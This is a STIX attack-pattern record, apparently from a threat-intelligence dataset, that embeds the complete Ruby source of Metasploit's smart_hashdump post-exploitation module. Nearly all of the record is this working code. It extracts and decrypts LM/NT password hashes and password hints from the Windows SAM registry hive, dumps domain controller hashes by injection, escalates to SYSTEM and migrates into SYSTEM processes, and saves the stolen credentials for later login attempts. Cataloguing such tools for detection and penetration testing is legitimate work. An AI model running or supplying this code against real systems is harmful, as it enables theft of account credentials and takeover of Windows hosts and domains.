{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4d60325e-3dfa-4918-b058-419bb7a93b29",
    "created": "2024-08-14T16:33:05.027048Z",
    "modified": "2024-08-14T16:33:05.027051Z",
    "name": "Windows Gather Local and Domain Controller Account Password Hashes",
    "description": " This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/smart_hashdump.rb",
            "external_id": "smart_hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Accounts\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Local and Domain Controller Account Password Hashes',\n        'Description' => %q{\n          This will dump local accounts from the SAM Database. If the target\n          host is a Domain Controller, it will dump the Domain Account Database using the proper\n          technique depending on privilege level, OS and role of the host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n              priv_elevate_getsystem\n              priv_passwd_get_sam_hashes\n              stdapi_registry_open_key\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptBool.new('GETSYSTEM', [ false, 'Attempt to get SYSTEM privilege on the target host.', false])\n\n      ]\n    )\n    @smb_port = 445\n    # Constants for SAM decryption\n    @sam_lmpass = \"LMPASSWORD\\x00\"\n    @sam_ntpass = \"NTPASSWORD\\x00\"\n    @sam_qwerty = \"!@\\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\\x00\"\n    @sam_numeric = \"0123456789012345678901234567890123456789\\x00\"\n    @sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')\n    @sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    host = Rex::FileUtils.clean_path(sysinfo['Computer'])\n    hash_file = store_loot('windows.hashes', 'text/plain', session, '', \"#{host}_hashes.txt\", 'Windows Hashes')\n    print_status('Hashes will be saved to the database if one is connected.')\n    print_good('Hashes will be saved in loot in JtR password file format to:')\n    print_status(hash_file)\n    smart_hash_dump(datastore['GETSYSTEM'], hash_file)\n  end\n\n  #-------------------------------------------------------------------------------\n\n  def capture_hboot_key(bootkey)\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account', KEY_READ)\n    return if !ok\n\n    vf = ok.query_value('F')\n    return if !vf\n\n    vf = vf.data\n    ok.close\n\n    hash = Digest::MD5.new\n    hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)\n\n    rc4 = OpenSSL::Cipher.new('rc4')\n    rc4.decrypt\n    rc4.key = hash.digest\n    hbootkey = rc4.update(vf[0x80, 32])\n    hbootkey << rc4.final\n    return hbootkey\n  end\n  #-------------------------------------------------------------------------------\n\n  def capture_user_keys\n    users = {}\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account\\\\Users', KEY_READ)\n    return if !ok\n\n    ok.enum_key.each do |usr|\n      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\#{usr}\", KEY_READ)\n      next if usr == 'Names'\n\n      users[usr.to_i(16)] ||= {}\n      users[usr.to_i(16)][:F] = uk.query_value('F').data\n      users[usr.to_i(16)][:V] = uk.query_value('V').data\n\n      # Attempt to get Hints (from Win7/Win8 Location)\n      begin\n        users[usr.to_i(16)][:UserPasswordHint] = uk.query_value('UserPasswordHint').data\n      rescue ::Rex::Post::Meterpreter::RequestError\n        users[usr.to_i(16)][:UserPasswordHint] = nil\n      end\n\n      uk.close\n    end\n    ok.close\n\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names', KEY_READ)\n    ok.enum_key.each do |usr|\n      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names\\\\#{usr}\", KEY_READ)\n      r = uk.query_value('')\n      rid = r.type\n      users[rid] ||= {}\n      users[rid][:Name] = usr\n\n      # Attempt to get Hints (from WinXP Location) only if it's not set yet\n      if users[rid][:UserPasswordHint].nil?\n        begin\n          uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Hints\\\\#{usr}\", KEY_READ)\n          users[rid][:UserPasswordHint] = uk_hint.query_value('').data\n        rescue ::Rex::Post::Meterpreter::RequestError\n          users[rid][:UserPasswordHint] = nil\n        end\n      end\n\n      uk.close\n    end\n    ok.close\n    users\n  end\n  #-------------------------------------------------------------------------------\n\n  def decrypt_user_keys(hbootkey, users)\n    users.each_key do |rid|\n      user = users[rid]\n\n      hashlm_enc = ''\n      hashnt_enc = ''\n\n      hoff = user[:V][0x9c, 4].unpack1('V') + 0xcc\n\n      # Check if hashes exist (if 20, then we've got a hash)\n      lm_exists = user[:V][0x9c + 4, 4].unpack1('V') == 20\n      nt_exists = user[:V][0x9c + 16, 4].unpack1('V') == 20\n\n      # If we have a hashes, then parse them (Note: NT is dependant on LM)\n      hashlm_enc = user[:V][hoff + 4, 16] if lm_exists\n      hashnt_enc = user[:V][(hoff + (lm_exists ? 24 : 8)), 16] if nt_exists\n\n      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)\n      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)\n    end\n\n    users\n  end\n  #-------------------------------------------------------------------------------\n\n  def decode_windows_hint(e_string)\n    d_string = ''\n    e_string.scan(/..../).each do |chunk|\n      bytes = chunk.scan(/../)\n      d_string += (bytes[1] + bytes[0]).to_s.hex.chr\n    end\n    d_string\n  end\n  #-------------------------------------------------------------------------------\n\n  def rid_to_key(rid)\n    s1 = [rid].pack('V')\n    s1 << s1[0, 3]\n\n    s2b = [rid].pack('V').unpack('C4')\n    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')\n    s2 << s2[0, 3]\n\n    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]\n  end\n  #-------------------------------------------------------------------------------\n\n  def decrypt_user_hash(rid, hbootkey, enchash, pass)\n    if enchash.empty?\n      case pass\n      when @sam_lmpass\n        return @sam_empty_lm\n      when @sam_ntpass\n        return @sam_empty_nt\n      end\n      return ''\n    end\n\n    des_k1, des_k2 = rid_to_key(rid)\n\n    d1 = OpenSSL::Cipher.new('des-ecb')\n    d1.decrypt\n    d1.padding = 0\n    d1.key = des_k1\n\n    d2 = OpenSSL::Cipher.new('des-ecb')\n    d2.decrypt\n    d2.padding = 0\n    d2.key = des_k2\n\n    md5 = Digest::MD5.new\n    md5.update(hbootkey[0, 16] + [rid].pack('V') + pass)\n\n    rc4 = OpenSSL::Cipher.new('rc4')\n    rc4.decrypt\n    rc4.key = md5.digest\n    okey = rc4.update(enchash)\n\n    d1o = d1.update(okey[0, 8])\n    d1o << d1.final\n\n    d2o = d2.update(okey[8, 8])\n    d1o << d2.final\n    d1o + d2o\n  end\n  #-------------------------------------------------------------------------------\n\n  def read_hashdump\n    host = session.session_host\n    collected_hashes = ''\n    tries = 1\n\n    begin\n      print_status(\"\\tObtaining the boot key...\")\n      bootkey = capture_boot_key\n\n      print_status(\"\\tCalculating the hboot key using SYSKEY #{bootkey.unpack1('H*')}...\")\n      hbootkey = capture_hboot_key(bootkey)\n\n      print_status(\"\\tObtaining the user list and keys...\")\n      users = capture_user_keys\n\n      print_status(\"\\tDecrypting user keys...\")\n      users = decrypt_user_keys(hbootkey, users)\n\n      print_status(\"\\tDumping password hints...\")\n      hint_count = 0\n      users.keys.sort { |a, b| a <=> b }.each do |rid|\n        # If we have a hint then print it\n        if !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?\n          print_good(\"\\t#{users[rid][:Name]}:\\\"#{users[rid][:UserPasswordHint]}\\\"\")\n          hint_count += 1\n        end\n      end\n      print_status(\"\\tNo users with password hints on this system\") if hint_count == 0\n\n      print_status(\"\\tDumping password hashes...\")\n      users.keys.sort { |a, b| a <=> b }.each do |rid|\n        # next if guest account\n        next if rid == 501\n\n        collected_hashes << \"#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack1('H*')}:#{users[rid][:hashnt].unpack1('H*')}:::\\n\"\n\n        print_good(\"\\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack1('H*')}:#{users[rid][:hashnt].unpack1('H*')}:::\")\n\n        service_data = {\n          address: host,\n          port: @smb_port,\n          service_name: 'smb',\n          protocol: 'tcp',\n          workspace_id: myworkspace_id\n        }\n\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          private_type: :ntlm_hash,\n          private_data: users[rid][:hashlm].unpack1('H*') + ':' + users[rid][:hashnt].unpack1('H*'),\n          username: users[rid][:Name]\n        }\n\n        credential_data.merge!(service_data)\n\n        # Create the Metasploit::Credential::Core object\n        credential_core = create_credential(credential_data)\n\n        # Assemble the options hash for creating the Metasploit::Credential::Login object\n        login_data = {\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        # Merge in the service data and create our Login\n        login_data.merge!(service_data)\n        create_credential_login(login_data)\n      end\n    rescue ::Interrupt\n      raise $ERROR_INFO\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      # Sometimes we get this invalid handle race condition.\n      # So let's retry a couple of times before giving up.\n      # See bug #6815\n      if (tries < 5) && e.to_s =~ /The handle is invalid/\n        print_status('Handle is invalid, retrying...')\n        tries += 1\n        retry\n\n      else\n        print_error(\"Meterpreter Exception: #{e.class} #{e}\")\n        print_error('This script requires the use of a SYSTEM user context (hint: migrate into service process)')\n      end\n    rescue ::Exception => e\n      print_error(\"Error: #{e.class} #{e} #{e.backtrace}\")\n    end\n    return collected_hashes\n  end\n  #-------------------------------------------------------------------------------\n\n  def inject_hashdump\n    collected_hashes = ''\n    host = session.session_host\n    # Load priv extension\n    session.core.use('priv')\n    # dump hashes\n    session.priv.sam_hashes.each do |h|\n      returned_hash = h.to_s.split(':')\n      if returned_hash[1] == 'j'\n        returned_hash.delete_at(1)\n      end\n      rid = returned_hash[1].to_i\n\n      # Skip the Guest Account\n      next if rid == 501\n\n      # skip if it returns nil for an entry\n      next if h.nil?\n\n      begin\n        user = returned_hash[0].scan(/^[a-zA-Z0-9_\\-$.]*/).join.gsub(/\\.$/, '')\n        lmhash = returned_hash[2].scan(/[a-f0-9]*/).join\n        next if lmhash.nil?\n\n        hash_entry = \"#{user}:#{rid}:#{lmhash}:#{returned_hash[3]}\"\n        collected_hashes << \"#{hash_entry}\\n\"\n        print_good(\"\\t#{hash_entry}\")\n\n        service_data = {\n          address: host,\n          port: @smb_port,\n          service_name: 'smb',\n          protocol: 'tcp',\n          workspace_id: myworkspace_id\n        }\n\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          private_type: :ntlm_hash,\n          private_data: \"#{lmhash}:#{returned_hash[3]}\",\n          username: user\n        }\n\n        credential_data.merge!(service_data)\n\n        # Create the Metasploit::Credential::Core object\n        credential_core = create_credential(credential_data)\n\n        # Assemble the options hash for creating the Metasploit::Credential::Login object\n        login_data = {\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        # Merge in the service data and create our Login\n        login_data.merge!(service_data)\n        create_credential_login(login_data)\n      rescue StandardError\n        next\n      end\n    end\n    return collected_hashes\n  end\n  #-------------------------------------------------------------------------------\n\n  # Function to migrate to a process running as SYSTEM\n  def move_to_sys\n    # Make sure you got the correct SYSTEM Account Name no matter the OS Language\n    local_sys = resolve_sid('S-1-5-18')\n    system_account_name = \"#{local_sys[:domain]}\\\\#{local_sys[:name]}\"\n\n    # Processes that can Blue Screen a host if migrated in to\n    dangerous_processes = ['lsass.exe', 'csrss.exe', 'smss.exe']\n\n    print_status('Migrating to process owned by SYSTEM')\n    session.sys.process.processes.each do |p|\n      # Check we are not migrating to a process that can BSOD the host\n      next if dangerous_processes.include?(p['name'])\n\n      next if p['pid'] == session.sys.process.getpid\n\n      next unless p['user'] == system_account_name\n\n      print_status(\"Migrating to #{p['name']}\")\n      session.core.migrate(p['pid'])\n      print_good(\"Successfully migrated to #{p['name']}\")\n      return\n    end\n  end\n\n  #-------------------------------------------------------------------------------\n\n  def smart_hash_dump(migrate_system, pwdfile)\n    domain_controller = domain_controller?\n    print_good('Host is a Domain Controller') if domain_controller\n\n    if !is_uac_enabled? || is_admin?\n      print_status('Dumping password hashes...')\n      version = get_version_info\n      # Check if Running as SYSTEM\n      if is_system?\n        # For DC's the registry read method does not work.\n        if domain_controller\n          begin\n            file_local_write(pwdfile, inject_hashdump)\n          rescue ::Exception\n            print_error('Failed to dump hashes as SYSTEM, trying to migrate to another process')\n\n            if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?\n              move_to_sys\n              file_local_write(pwdfile, inject_hashdump)\n            else\n              print_error('Could not get NTDS hashes!')\n            end\n          end\n\n          # Check if not DC\n        else\n          print_status 'Running as SYSTEM extracting hashes from registry'\n          file_local_write(pwdfile, read_hashdump)\n        end\n\n        # Check if not running as SYSTEM\n      elsif domain_controller\n\n        # Check if Domain Controller\n        begin\n          file_local_write(pwdfile, inject_hashdump)\n        rescue StandardError\n          if migrate_system\n            print_status('Trying to get SYSTEM privilege')\n            results = session.priv.getsystem\n            if results[0]\n              print_good('Got SYSTEM privilege')\n              if version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2012_R2) && version.windows_server?\n                # Migrate process since on Windows 2008 R2 getsystem\n                # does not set certain privilege tokens required to\n                # inject and dump the hashes.\n                move_to_sys\n              end\n              file_local_write(pwdfile, inject_hashdump)\n            else\n              print_error('Could not obtain SYSTEM privileges')\n            end\n          else\n            print_error('Could not get NTDS hashes!')\n          end\n        end\n      elsif version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win81)\n        if migrate_system\n          print_status('Trying to get SYSTEM privilege')\n          results = session.priv.getsystem\n          if results[0]\n            print_good('Got SYSTEM privilege')\n            file_local_write(pwdfile, read_hashdump)\n          else\n            print_error('Could not obtain SYSTEM privilege')\n          end\n        else\n          print_error('On this version of Windows you need to be NT AUTHORITY\\\\SYSTEM to dump the hashes')\n          print_error('Try setting GETSYSTEM to true.')\n        end\n\n      elsif migrate_system\n        print_status('Trying to get SYSTEM privilege')\n        results = session.priv.getsystem\n        if results[0]\n          print_good('Got SYSTEM privilege')\n          file_local_write(pwdfile, read_hashdump)\n        else\n          print_error('Could not obtain SYSTEM privileges')\n        end\n      else\n        file_local_write(pwdfile, inject_hashdump)\n\n      end\n    else\n      print_error('Insufficient privileges to dump hashes!')\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}